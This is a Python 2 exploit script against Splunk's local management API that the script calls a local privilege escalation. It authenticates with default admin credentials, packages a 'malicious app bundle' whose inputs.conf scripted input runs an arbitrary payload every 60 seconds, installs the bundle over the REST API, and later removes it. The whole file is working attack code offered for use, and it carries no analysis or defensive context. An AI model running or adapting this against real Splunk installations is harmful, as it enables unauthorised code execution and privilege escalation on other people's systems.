import sys, os, tempfile, shutil
import tarfile
import requests
import argparse

requests.packages.urllib3.disable_warnings(category=requests.packages.urllib3.exceptions.InsecureRequestWarning)

SPLUNK_APP_NAME = '_PWN_APP_'


def create_splunk_bundle(options):
    tmp_path = tempfile.mkdtemp()
    os.mkdir(os.path.join(tmp_path, SPLUNK_APP_NAME))

    bin_dir = os.path.join(tmp_path, SPLUNK_APP_NAME, "bin")
    os.mkdir(bin_dir)
    pwn_file = os.path.join(bin_dir, options.payload_file)
    open(pwn_file, "w").write(options.payload)
    # make the script executable - not 100% certain this makes a difference
    os.chmod(pwn_file, 0o700)

    local_dir = os.path.join(tmp_path, SPLUNK_APP_NAME, "local")
    os.mkdir(local_dir)
    inputs_conf = os.path.join(local_dir, "inputs.conf")
    with open(inputs_conf, "w") as f:
        inputs = '[script://$SPLUNK_HOME/etc/apps/{}/bin/{}]\n'.format(SPLUNK_APP_NAME, options.payload_file)
        inputs += 'disabled = false\n'
        inputs += 'index = default\n'
        inputs += 'interval = 60.0\n'
        inputs += 'sourcetype = test\n'
        f.write(inputs)

    (fd, tmp_bundle) = tempfile.mkstemp(suffix='.tar')
    os.close(fd)
    with tarfile.TarFile(tmp_bundle, mode="w") as tf:
        tf.add(os.path.join(tmp_path, SPLUNK_APP_NAME), arcname=SPLUNK_APP_NAME)

    shutil.rmtree(tmp_path)
    return tmp_bundle



parser = argparse.ArgumentParser()
parser.add_argument('--scheme', default="https")
parser.add_argument('--port', default=8089)
parser.add_argument('--username', default="admin")
parser.add_argument('--password', default="changeme")
parser.add_argument('--payload', default="calc.exe")
parser.add_argument('--payload-file', default="pwn.bat")
options = parser.parse_args()

print "Running in local mode (Local Privilege Escalation)"
options.host = "127.0.0.1"

SPLUNK_BASE_API = "{}://{}:{}/services/apps/local/".format(options.scheme, options.host, options.port, )

s = requests.Session()
s.auth = requests.auth.HTTPBasicAuth(options.username, options.password)
s.verify = False

print "[.] Authenticating..."
req = s.get(SPLUNK_BASE_API)
if req.status_code == 401:
    print "Authentication failure"
    print ""
    print req.text
    sys.exit(-1)
print "[+] Authenticated"

print "[.] Creating malicious app bundle..."
BUNDLE_FILE = create_splunk_bundle(options)
print "[+] Created malicious app bundle in: " + BUNDLE_FILE

lurl = BUNDLE_FILE

print "[.] Installing app from: " + lurl
req = s.post(SPLUNK_BASE_API, data={'name': lurl, 'filename': True, 'update': True})
if req.status_code != 200 and req.status_code != 201:
    print "Got a problem: " + str(req.status_code)
    print ""
    print req.text
print "[+] App installed, your code should be running now!"

print "\nPress RETURN to cleanup"
raw_input()
os.remove(BUNDLE_FILE)

print "[.] Removing app..."
req = s.delete(SPLUNK_BASE_API + SPLUNK_APP_NAME)
if req.status_code != 200 and req.status_code != 201:
    print "Got a problem: " + str(req.status_code)
    print ""
    print req.text
print "[+] App removed"

print "\nPress RETURN to exit"
raw_input()
print "Bye!"
